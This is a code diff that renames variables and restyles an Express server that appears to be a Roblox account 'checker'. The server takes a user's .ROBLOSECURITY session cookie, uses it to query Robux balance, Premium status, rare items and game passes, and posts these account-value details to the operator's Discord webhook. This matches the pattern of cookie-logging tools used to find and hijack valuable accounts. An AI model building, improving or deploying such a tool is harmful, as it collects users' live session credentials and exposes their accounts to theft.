@@ -2,7 +2,7 @@ const express = require('express');
 const app = express();
 app.use(express.json());
 
-// CORS
+// CORS middleware
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -13,7 +13,7 @@ app.use((req, res, next) => {
   next();
 });
 
-// Strona główna – po angielsku
+// Main page (HTML)
 app.get('/', (req, res) => {
   res.send(`<!DOCTYPE html>
 <html lang="en">
@@ -102,7 +102,7 @@ app.post('/check', async (req, res) => {
   }
 
   try {
-    // CSRF token
+    // Get CSRF token
     const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
       method: 'POST',
       headers: {
@@ -111,9 +111,9 @@ app.post('/check', async (req, res) => {
       },
     });
     const csrfToken = tokenRes.headers.get('x-csrf-token');
-    if (!csrfToken) throw new Error('Failed to get X-CSRF-Token – invalid/expired cookie');
+    if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token');
 
-    // Authenticated user
+    // Get authenticated user
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       headers: {
         'Cookie': `.ROBLOSECURITY=${cookie}`,
@@ -121,39 +121,39 @@ app.post('/check', async (req, res) => {
         'Accept': 'application/json',
       },
     });
-    if (!userRes.ok) throw new Error('Invalid cookie');
+    if (!userRes.ok) throw new Error('Invalid or expired cookie');
     const userData = await userRes.json();
 
-    // Email verified (verified hat asset)
+    // Email verified (via Verified Badge hat)
     let emailVerified = false;
     try {
-      const owns = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
+      const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
         headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
       });
-      if (owns.ok) {
-        const d = await owns.json();
-        emailVerified = d.data?.length > 0;
+      if (ownsRes.ok) {
+        const data = await ownsRes.json();
+        emailVerified = data.data?.length > 0;
       }
     } catch {}
 
     // Premium status
     let hasPremium = false;
     try {
-      const prem = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
+      const premRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
         headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
       });
-      if (prem.ok) hasPremium = await prem.json();
+      if (premRes.ok) hasPremium = await premRes.json();
     } catch {}
 
     // Robux balance
     let robux = 0;
     try {
-      const cur = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
+      const curRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
         headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
       });
-      if (cur.ok) {
-        const d = await cur.json();
-        robux = d.robux || 0;
+      if (curRes.ok) {
+        const data = await curRes.json();
+        robux = data.robux || 0;
       }
     } catch {}
 
@@ -161,11 +161,11 @@ app.post('/check', async (req, res) => {
     let accountAgeDays = 0;
     let created = null;
     try {
-      const prof = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
-      if (prof.ok) {
-        const p = await prof.json();
-        if (p.created) {
-          created = p.created;
+      const profileRes = await fetch(`https://users.roblox.com/v1/users/${userData.id}`);
+      if (profileRes.ok) {
+        const profile = await profileRes.json();
+        if (profile.created) {
+          created = profile.created;
           accountAgeDays = Math.floor((Date.now() - new Date(created).getTime()) / 86400000);
         }
       }
@@ -174,28 +174,32 @@ app.post('/check', async (req, res) => {
     // Avatar thumbnail
     let avatarUrl = null;
     try {
-      const thumb = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
-      if (thumb.ok) {
-        const t = await thumb.json();
-        avatarUrl = t.data?.[0]?.imageUrl;
+      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
+      if (thumbRes.ok) {
+        const thumbData = await thumbRes.json();
+        avatarUrl = thumbData.data?.[0]?.imageUrl || null;
       }
     } catch {}
 
-    // Game passes
+    // Gamepasses
     const mm2Ids = [429957, 1308795];
     const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
     const sabIds = [1227013099, 1229510262, 1228591447];
-    const allPasses = [...mm2Ids, ...ampIds, ...sabIds];
+    const allPassIds = [...mm2Ids, ...ampIds, ...sabIds];
     const ownedPasses = [];
 
-    for (const id of allPasses) {
+    for (const passId of allPassIds) {
       try {
-        const res = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${id}`, {
-          headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
+        const gpRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/GamePass/${passId}`, {
+          headers: {
+            'Cookie': `.ROBLOSECURITY=${cookie}`,
+            'X-CSRF-TOKEN': csrfToken,
+            'Accept': 'application/json'
+          }
         });
-        if (res.ok) {
-          const d = await res.json();
-          if (d.data?.length > 0) ownedPasses.push(id);
+        if (gpRes.ok) {
+          const gpData = await gpRes.json();
+          if (gpData.data?.length > 0) ownedPasses.push(passId);
         }
       } catch {}
     }
@@ -204,7 +208,7 @@ app.post('/check', async (req, res) => {
     const ampCount = ownedPasses.filter(id => ampIds.includes(id)).length;
     const sabCount = ownedPasses.filter(id => sabIds.includes(id)).length;
 
-    // Headless & Korblox bundles
+    // Headless & Korblox (using bundle IDs you specified)
     let hasHeadless = false;
     let hasKorblox = false;
     try {
@@ -212,23 +216,23 @@ app.post('/check', async (req, res) => {
         headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
       });
       if (hRes.ok) {
-        const d = await hRes.json();
-        hasHeadless = d.data?.length > 0;
+        const hData = await hRes.json();
+        hasHeadless = hData.data?.length > 0;
       }
 
       const kRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Bundle/192`, {
         headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
       });
       if (kRes.ok) {
-        const d = await kRes.json();
-        hasKorblox = d.data?.length > 0;
+        const kData = await kRes.json();
+        hasKorblox = kData.data?.length > 0;
       }
     } catch {}
 
-    const resultData = {
+    // Prepare response for frontend
+    const result = {
       success: true,
       username: userData.name,
-      displayName: userData.displayName || userData.name,
       userId: userData.id,
       hasPremium,
       robux,
@@ -243,13 +247,13 @@ app.post('/check', async (req, res) => {
       sabCount
     };
 
-    res.json(resultData);
+    res.json(result);
 
-    // Discord webhook – True / False zamiast Yes / No
-    const webhook = process.env.WEBHOOK;
-    if (webhook) {
+    // Send to Discord webhook
+    const webhookUrl = process.env.WEBHOOK;
+    if (webhookUrl) {
       try {
-        await fetch(webhook, {
+        await fetch(webhookUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -262,12 +266,7 @@ app.post('/check', async (req, res) => {
               },
               fields: [
                 {
-                  name: "┌─────── Account Stats ───────┐",
-                  value: `• Account Age: **${accountAgeDays} days**\n• Game Developer: **False**\n• Game Visits: **?—**\n• Group Owner: **?—**`,
-                  inline: false
-                },
-                {
-                  name: "┌────────── Info ──────────┐",
+                  name: "**Info**",
                   value:
                     `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
                     `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n` +
@@ -275,7 +274,7 @@ app.post('/check', async (req, res) => {
                   inline: true
                 },
                 {
-                  name: "┌──────── Games ──────────┐",
+                  name: "**Games**",
                   value:
                     `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
                     `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
@@ -283,7 +282,7 @@ app.post('/check', async (req, res) => {
                   inline: true
                 },
                 {
-                  name: "┌─────── Inventory ───────┐",
+                  name: "**Inventory**",
                   value:
                     `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
                     `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`,
@@ -297,16 +296,18 @@ app.post('/check', async (req, res) => {
             }]
           })
         });
-      } catch (e) {
-        console.error("Webhook error:", e.message);
+      } catch (webhookErr) {
+        console.error('Webhook send failed:', webhookErr.message);
       }
     }
 
   } catch (err) {
     console.error(err);
-    res.status(500).json({ error: err.message || 'Server error' });
+    res.status(500).json({ error: err.message || 'Internal server error' });
   }
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+app.listen(PORT, () => {
+  console.log(`Server running on port ${PORT}`);
+});
